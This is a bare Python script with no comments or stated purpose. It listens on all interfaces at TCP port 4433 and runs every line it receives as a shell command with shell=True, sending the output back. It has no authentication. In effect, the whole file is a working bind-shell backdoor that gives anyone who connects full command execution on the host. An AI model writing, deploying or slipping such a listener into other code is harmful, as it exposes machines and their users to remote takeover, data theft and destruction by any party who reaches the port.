import socket
import subprocess

HOST = '0.0.0.0'
PORT = 4433

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

while True:
    conn, addr = s.accept()
    while True:
        command = conn.recv(1024).decode()
        try:
            conn.send(b'')
        except ConnectionResetError:
            break
        if command.strip() == ":q":
            conn.close()
            break
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = e.output
        conn.send(output + b'\n')
    conn.close()
